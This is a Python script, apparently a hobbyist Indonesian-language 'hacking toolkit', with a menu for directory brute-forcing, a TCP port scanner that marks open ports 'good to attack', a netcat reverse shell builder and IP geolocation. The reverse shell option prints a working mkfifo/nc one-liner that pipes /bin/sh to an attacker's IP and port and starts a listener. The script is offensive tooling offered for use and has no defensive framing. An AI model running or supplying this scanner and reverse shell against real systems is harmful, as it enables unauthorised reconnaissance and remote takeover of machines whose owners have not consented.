# YANG MAU BANTU NGEMBANGIN SIHLAKAN CHAT AING 

import requests as req
import colorama 
from colorama import Fore
import socket
import os
import webbrowser as web
import time
import json as j

os.system ("clear")

print (Fore.GREEN ,"""" 
M""MMMM""M dP       oo   dP   M""MMMMM""MM          dP                
M  `MM'  M 88            88   M  MMMMM  MM          88                
MM.    .MM 88d888b. dP d8888P M         `M .d8888b. 88  .dP  .d8888b. 
M  .mm.  M 88'  `88 88   88   M  MMMMM  MM 88'  `88 88888"   Y8ooooo. 
M  MMMM  M 88    88 88   88   M  MMMMM  MM 88.  .88 88  `8b.       88 
M  MMMM  M dP    dP dP   dP   M  MMMMM  MM `88888P8 dP   `YP `88888P' 
MMMMMMMMMM                    MMMMMMMMMMMM                            
""")
def SimDirBrute():

    os.system ("clear")
    print (Fore.GREEN,"""
    /~~\'             |~~\ '    |~~\          |    
    `--.||/~\ /~\ |~~\|   |||/~\|--<|/~\|   |~|~/~/
    \__/||   |   ||__/|__/ ||   |__/|    \_/| | \/_
                  |                                \n
    """)
    print ("Author : VarelSecurity")
    print ("Github : github.com/varelvalensio")
    print ("example : 192.168.1.1 / example.com")
    print ("Jika tidak ada wordlist masukan fz.txt !\n")
    url = input("masukan url : ")
    wordlists = input("masukan wordlists : ")
    print ("")
    file = open(wordlists, "r")
    line = file.readlines()
    for lines in line:
        list = lines.strip()
        r = req.get(f"{url}/{list}")
        if r.status_code ==200:
            print (Fore.BLUE,f"{url}/{list} : {r.status_code}")
        elif r.status_code ==404:
            print (Fore.RED, f"{url}/{list} : {r.status_code}")

def PortScan():
    print (Fore.GREEN,"""
    888888                   888888                  
    8    8 eeeee eeeee eeeee 8      eeee eeeee eeeee 
    8eeee8 8  88 8   8   8   8eeeee 8  8 8   8 8   8 
    88     8   8 8eee8e  8e      88 8e   8eee8 8e  8 
    88     8   8 88   8  88  e   88 88   88  8 88  8 
    88     8eee8 88   8  88  8eee88 88e8 88  8 88  8 
    """)
    print ("Author : VarelSecurity")
    print ("Github : github.com/varelvalensio")
    print ("Tekan ctrl + c proses tidak stop !")
    print ("")
    ip = input("masukan ip\t : ")
    for ports in range(1,65535):
      s = socket.socket()
      socket.setdefaulttimeout(1)
      host = s.connect_ex((ip, ports))
      s.close()
      if host ==0:
        print (Fore.BLUE, f"{ports} is open good to attack")

def ReverseShell():
    print ("Simple ncat reverse shell\n")
    ip = input ("Masukan ip anda : ")
    port = input ("Port yang ingin di dengar : ")
    print (f"SHELL ANDA : rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    os.system(f"nc -lnvp {port}")

def TrackingIp():
    print ("""  
    8888888        8888888b.         888 88888888888                    888      
  888          888   Y88b        888     888                        888      
  888          888    888        888     888                        888      
  888  88888b. 888   d88P888  88888888b. 888 888d888 8888b.  .d8888b888  888 
  888  888 "88b8888888P" 888  888888 "88b888 888P"      "88bd88P"   888 .88P 
  888  888  888888       888  888888  888888 888    .d888888888     888888K  
  888  888 d88P888       Y88b 888888 d88P888 888    888  888Y88b.   888 "88b 
888888888888P" 888        "Y8888888888P" 888 888    "Y888888 "Y8888P888  888 
       888                                                                   
       888                                                                   
       888\n     
    """)
    print ("Author : VarelSecurity")
    print ("Github : github.com/varelvalensio\n")
    ip = input("masukan ip : ")
    coba = req.get(f"http://ip-api.com/json/{ip}")
    if coba.status_code ==200:
        data = j.loads(coba.text)
        if data ["status"] == "success":
            print ("Kota : ", data["city"])
            print ("Negara : ", data["country"])
            print ("Waktu : ", data["timezone"])
            print ("Isp : ", data["isp"])
            lokasi =  data["lat"] , data["lon"]
            web.open_new(f"https://www.google.co.id/maps/@{lokasi}")
        
print ("Author : VarelSecurity")
print ("Github : github.com/varelvalensio")
print ("Version : 1.0")
hehe = req.get("https://api.myip.com")
if hehe.status_code == 200:
    dataip = j.loads(hehe.text)
    print ("ip public anda : ",dataip["ip"])
print ("")
print ("[+]------------------------[+]")
print ("[1] Brute force directory")
print ("[2] Port scanner")
print ("[3] NC  Reverse shell")
print ("[4] Ip public tracker ")
print ("[5] Kasih saran ")
print ("[+]------------------------[+]")
pilih = input ("root@xhithaks:~# ")
if pilih =="1":
    SimDirBrute()
elif pilih =="2":
    PortScan()
elif pilih =="3":
    ReverseShell()
elif pilih =="4":
    TrackingIp()
elif pilih =="5":
    web.open_new("https://wa.me/6282175280152/")
else:
    os.system("clear")
    print ("Input anda salah coba lagi")
    time.sleep(2)
    os.system ("python3 xhithaxs.py")